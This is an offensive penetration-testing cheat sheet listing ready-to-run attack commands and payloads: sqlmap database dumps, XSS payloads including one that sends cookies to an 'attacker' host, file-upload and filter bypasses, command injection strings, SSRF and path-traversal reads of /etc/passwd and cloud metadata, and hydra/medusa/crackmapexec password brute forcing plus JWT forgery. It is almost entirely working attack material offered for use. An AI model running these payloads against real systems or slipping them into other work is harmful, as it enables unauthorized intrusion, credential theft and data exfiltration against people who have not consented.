# Page 1

## 02 - Exploitation

## Web Application Attacks

**SQL injection**

```
sqlmap -u "http://$TARGET/page?id=1" --dbs --batch
sqlmap -u "http://$TARGET/page?id=1" -D dbname --tables --batch
sqlmap -u "http://$TARGET/page?id=1" -D dbname -T users --dump --batch
sqlmap -r request.txt --level 5 --risk 3 --batch   # from a saved Burp request
```

**XSS**

| Type          | Payload                                                            |
| ------------- | ------------------------------------------------------------------ |
| Reflected     | `<script>alert(1)</script>`                                        |
| Stored        | `<img src=x onerror=fetch('http://attacker/?c='+document.cookie)>` |
| DOM           | `';alert(1)//`                                                     |
| Filter bypass | `<ScRiPt>alert(1)</sCrIpT>` or `<svg onload=alert(1)>`             |

**File upload bypass**

* Swap `Content-Type` to `image/jpeg` while uploading `.php`
* Double extension: `shell.php.jpg`
* Null byte (older PHP): `shell.php%00.jpg`
* Prepend magic bytes `\xFF\xD8\xFF` to a webshell
* Drop `.htaccess` to make `.jpg` execute as PHP

**Command injection**

```
ping -c1 $TARGET; id
$(id)  or  `id`  or  %0aid
; id | id || id && id
```

**SSRF**

```
http://127.0.0.1:PORT/admin
http://169.254.169.254/latest/meta-data/     # cloud metadata
file:///etc/passwd
gopher://127.0.0.1:6379/_*1%0d%0a...         # Redis via SSRF
```

**LFI / path traversal**

```
../../../../etc/passwd
....//....//....//etc/passwd                  # filter bypass
php://filter/convert.base64-encode/resource=config.php
expect://id                                    # RCE via expect wrapper
```

## Authentication Attacks

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
medusa -h $TARGET -u admin -P rockyou.txt -M ssh
crackmapexec smb $TARGET -u users.txt -p passwords.txt
```

**JWT**

| Attack           | Method                                            |
| ---------------- | ------------------------------------------------- |
| `none` algorithm | Set `alg:none`, strip the signature               |
| Weak secret      | `hashcat -a 0 -m 16500 token.jwt rockyou.txt`     |
| RS256 → HS256    | Sign with the public key as the HMAC secret       |
| `kid` injection  | `kid: ../../dev/null` — sign with an empty string |

## Service-Specific Checks

| Service | Port | Check for               | Tool                                             |
| ------- | ---- | ----------------------- | ------------------------------------------------ |
| FTP     | 21   | Anonymous login         | `ftp $TARGET` (user: anonymous)                  |
| SSH     | 22   | Old version, weak keys  | `ssh-audit $TARGET`                              |
| SMB     | 445  | Shares, EternalBlue     | `smbmap -H $TARGET -u '' -p ''`                  |
| HTTP    | 80   | Web vulns, CMS          | `nikto -h $TARGET`                               |
| SMTP    | 25   | Open relay, user enum   | `smtp-user-enum -M VRFY -U users.txt -t $TARGET` |
| SNMP    | 161  | Default community       | `snmpwalk -c public -v1 $TARGET`                 |
| MSSQL   | 1433 | SA creds, `xp_cmdshell` | `crackmapexec mssql $TARGET -u sa -p pass`       |
| Redis   | 6379 | No auth                 | `redis-cli -h $TARGET info`                      |
